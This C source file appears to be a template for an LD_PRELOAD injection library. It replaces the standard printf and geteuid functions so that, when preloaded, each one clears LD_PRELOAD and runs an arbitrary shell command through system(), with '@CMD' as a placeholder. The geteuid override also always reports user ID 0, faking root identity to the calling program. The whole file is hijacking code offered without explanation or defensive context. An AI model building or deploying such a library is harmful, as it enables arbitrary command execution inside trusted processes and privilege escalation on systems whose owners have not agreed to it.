#include <stdlib.h>
#include<stdio.h>
#include <string.h>

void PAYLAOD(){
system("@CMD");
}

int printf (const char *__restrict __format, ...){
if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    PAYLAOD();
    return 0;
}

int geteuid(){
if(getenv("LD_PRELOAD") == NULL)
{
return 0;
}
unsetenv("LD_PRELOAD");
PAYLAOD();
return 0;
}